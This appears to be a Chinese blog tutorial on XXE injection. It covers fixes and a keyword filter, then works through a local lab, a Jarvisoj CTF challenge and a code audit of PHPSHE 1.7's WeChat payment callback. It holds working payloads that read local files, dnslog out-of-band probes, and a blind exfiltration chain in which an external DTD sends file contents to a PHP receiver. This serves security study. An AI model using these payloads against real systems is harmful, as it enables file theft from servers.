![1646628263199-9fcf4be6-2cd1-4496-8bf3-c47d5d3a5b32.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102633827-1676467916.png)

```plain
#知识点：
1、XML&XXE-原理&发现&利用&修复等
2、XML&XXE-黑盒模式下的发现与利用
3、XML&XXE-白盒模式下的审计与利用
4、XML&XXE-无回显&伪协议&产生层面

#思路点：
参考：https://www.cnblogs.com/20175211lyz/p/11413335.html
-XXE黑盒发现：
1、获取得到Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试
2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe
3、XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE Payload被执行
-XXE白盒发现：
1、可通过应用功能追踪代码定位审计
2、可通过脚本特定函数搜索定位审计（xml）
3、可通过伪协议玩法绕过相关修复等

#详细点：
XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。

XML 与 HTML 的主要差异：
XML 被设计为传输和存储数据，其焦点是数据的内容。
HTML 被设计用来显示数据，其焦点是数据的外观。
HTML 旨在显示信息 ，而 XML 旨在传输信息。

XXE修复防御方案：
-方案1-禁用外部实体
PHP:
libxml_disable_entity_loader(true);
JAVA:
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);
Python：
from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))

-方案2-过滤用户提交的XML数据
过滤关键词：<!DOCTYPE和<!ENTITY，或者SYSTEM和PUBLIC
```

![1646628314462-443e376c-5f55-4ad5-8b72-1acad8f9b433.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102657470-1128124237.png)

![1646628328093-8965cdc2-5e07-49c8-9d0a-b53327d5f5a5.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102656464-1079044498.png)

- XML&XXE-黑盒-原理&探针&利用&玩法等

------

```plain
这类漏洞与之前的漏洞有所不同，格式传输上的不同。在格式传输中有json，字符串，xml格式。
参考：https://www.cnblogs.com/20175211lyz/p/11413335.html


访问：127.0.0.1:8081/web/php_xxe
进行抓包
```

![1646631985058-d53cf979-c5f8-42f9-9e39-4471250200b9.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102657744-1218227147.png)

```plain
发现账号密码的传输格式是：<user><username>admin</username><password>amdin</password></user>
数据包中X-Requested-With: XMLHttpRequest   Accept: application/xml

如果是自己博客的登录账号密码
```

![1646632474426-3f0b8072-a7e8-45a3-9aba-60865cae7be0.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102655101-173679462.png)

```plain
这两个在数据传输的过程：
<user><username>admin</username><password>amdin</password></user>
btnPost=%E7%99%BB%E5%BD%95&username=admin&password=21232f297a57a5a743894a0e4a801fc3&savedate=1

Accept: text/html这个也是不同的。

所以他的接受数据是不一样的，那么他肯定是从xml格式去接受数据。
那么他在代码中是怎么处理数据的呢？
```

![1646633163807-309725aa-45e0-4bfd-a130-8ff0a03a23fc.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102655977-190139109.png)

```plain
那么如果用带有恶意的xml语言去访问他，那么他是不是会形成漏洞呢？

客户端：xml发送数据
服务端：xml解析数据

利用xml写一个带有文件读取的代码尝试发送，如果被解析，那么就会得到类似文件读取功能实现。

那么如何去写文件读取代码呢？

读文件：
<?xml version="1.0"?>
<!DOCTYPE Mikasa [
<!ENTITY test SYSTEM  "file:///d:/www.txt">
]>
<user><username>&test;</username><password>Mikasa</password></user>
```

![1646633954230-279af0a7-2af3-4906-99b8-3f824c9d9d5c.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102656015-60033851.png)

```plain
可以看到得到了www.txt的内容。

那么还有其他的玩法吗？可以参考：https://www.cnblogs.com/20175211lyz/p/11413335.html

带外测试：（能不能加载远程文件）
用到平台dnslog.cn

<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % file SYSTEM "http://ua4zzy.dnslog.cn">
    %file;
]>
<user><username>&send;</username><password>Mikasa</password></user>
```

![1646634600084-e2a4c70a-43fe-49f4-859b-b3d4647b7810.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102656475-836021061.png)

```plain
为什么来进行带外测试呢？为了解决无回显问题，类似于正向连接和反向连接问题。

如果再代码中没有输出，注释掉
```

![1646634843704-ca8b3ada-b4ef-4eac-97ba-c27507f79f09.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102655689-1081519013.png)

```plain
注释掉后，再一次利用上面的payload进行读取文件，发现已经读取不到文件内容了。
```

![1646635239124-9694a938-cb87-4578-8f88-dd31592584dd.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102657828-7797614.png)

```plain
读取不到文件，可能的方法有很多种：1.代码写错 2.文件不回显 3.路径写错
带外测试是判断这个漏洞有没有，判断能不能想外部发送数据。

测试能带外测试后，那么就引用外部实体

外部引用实体dtd：引用远程evil2.dtd文件，evil2.dtd文件是读取文件（核心代码） 解决拦截防护绕过问题 这个需要有回显。
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % file SYSTEM "http://127.0.0.1:8081/web/php_xxe/evil2.dtd">
    %file;
]>
<user><username>&send;</username><password>Mikasa</password></user>

evil2.dtd：读取d:www.txt内容
<!ENTITY send SYSTEM "file:///d:/www.txt">
```

![1646636610367-db75177a-cc91-43ea-9b56-71db7b2b9637.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102656584-436873799.png)

```plain
那么解决不回显的引用外部实体，那应该怎么处理呢？

无回显读文件，解决数据不回显问题。把数据进行传参，然后在进行接受。
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///d:/www.txt">
<!ENTITY % remote SYSTEM "http://127.0.0.1:8081/web/php_xxe/test.dtd">
%remote;
%all;
]>
<root>&send;</root>

test.dtd
<!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:8081/web/get1.php?file=%file;'>">

get1.php
<?php
$data=$_GET['file'];
$myfile = fopen("file.txt", "w+");
fwrite($myfile, $data);
fclose($myfile);
?>

在http://127.0.0.1:8081/web/get1.php同级目录下查看file.txt文件就可以获取到www.txt内容。
```

- XML&XXE-前端-CTF&Jarvisoj&探针&利用

------

```plain
http://web.jarvisoj.com:9882/
XXE黑盒发现：
1、获取得到Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试
2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe
流程：功能分析-前端提交-源码&抓包-构造Paylod测试

测试抓包：
```

![1646637917011-da76d60b-394a-4cac-b570-37b37e4e9d0c.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102657356-1789050327.png)

```plain
发现是json格式，点击源代码：
```

![1646638375815-e3c7a701-7ccb-4469-a13b-976d1a455df7.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102657110-2086091274.png)

```plain
关键代码函数XMLHttpRequest，在网上搜索https://www.w3school.com.cn/xml/xml_http.asp

其实就是考的是xml

那么就直接把数据改为xml即可，用到之前的payload
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "file:///home/ctf/flag.txt">
]>
<x>&f;</x>

更改请求数据格式：Content-Type: application/xml
```

![1646639299177-9ff4cc26-974c-4587-a1bf-883cbfdc62f1.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102656904-1232454221.png)

- XML&XXE-白盒-CMS&PHPSHE&无回显审计

------

```plain
针对xxe漏洞挖掘，重点是关键函数，如果是数据传输，那么就很难被发现。（不知道特定功能点）
那应该搜什么关键函数呢？可以在网上直接查找相对应的资料。https://www.cnblogs.com/timelesszhuang/p/4699734.html

全局搜索simplexml_load_string关键函数
```

![1646698299754-c2b637bb-0708-40f1-a41e-c15e41264711.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102658943-1426082134.png)

```plain
找到相对应的文件
```

![1646698649133-a8a901e4-3d90-43cb-aed8-4d1b0931ff26.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102656998-1483616373.png)

```plain
关键接受代码：$xml = file_get_contents("php://input");
这个代收代码简单的说就是接受所有的数据，POST也接受。

这个代码写在了pe_getxml这个函数里，那么继续搜索哪里调用了这串代码。
```

![1646699072483-b8617154-3309-46e0-bd10-b8fa3c947a9d.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102657633-1313042304.png)

```plain
继续搜索wechat_getxml函数
```

![1646699179380-791af835-cd8e-4273-a876-f01993fcb354.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102656751-1399907816.png)

```plain
思路回想一下：
漏洞函数在自定义函数pe_getxml里面-->找谁调用了pe_getxml函数-->找到调用pe_getxml函数的wechat_getxml函数，继续寻找谁调用了wechat_getxml函数，最后钟爱到了$xml = wechat_getxml();

审计流程：
1、漏洞函数simplexml_load_string
2、pe_getxml函数调用了漏洞函数
3、wechat_getxml调用了pe_getxml
4、notify_url.php调用了wechat_getxml
访问notify_url文件触发wechat_getxml函数,构造Paylod测试

漏洞产生的文件是D:\phpstudy_pro\WWW\phpshe1.7\include\plugin\payment\wechat\notify_url.php
那么直接访问漏洞地址http://127.0.0.1:8111/include/plugin/payment/wechat/notify_url.php

访问进行抓包：构造payload：
先尝试读取文件，
<?xml version="1.0"?>
<!DOCTYPE Mikasa [
<!ENTITY test SYSTEM  "file:///d:/www.txt">
]>
<user><username>&test;</username><password>Mikasa</password></user>
```

![1646700125869-8b3ad136-eb76-4f9e-8385-10a622803844.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102913218-1346809926.png)

```plain
发现他没有读到内容，那么是什么问题呢？
1.不存在漏洞
2.无回显
3.文件不存在
4.payload不对

那么就用带外测试，解决文件不存在，无回显问题。如果带外不能成功，要么就是payload写错，要么就是没漏洞。
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % file SYSTEM "http://bepc1m.dnslog.cn">
    %file;
]>
<user><username>&send;</username><password>Mikasa</password></user>
```

![1646700530151-df8db52f-333c-4968-b7ee-fe3973f8dbab.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102657595-1067938794.png)

```plain
在dnslog.cn平台上接受到数据，证明漏洞存在。

然后带外传递数据解决无回显：
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///d:/www.txt">
<!ENTITY % remote SYSTEM "http://127.0.0.1:8081/web/php_xxe/test.dtd">
%remote;
%all;
]>
<root>&send;</root>

test.dtd：
<!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:8081/web/get1.php?file=%file;'>">

get1.php:
<?php
$data=$_GET['file'];
$myfile = fopen("file.txt", "w+");
fwrite($myfile, $data);
fclose($myfile);
?>

但是这里没有复现成功。

$$a=123
$123 =
```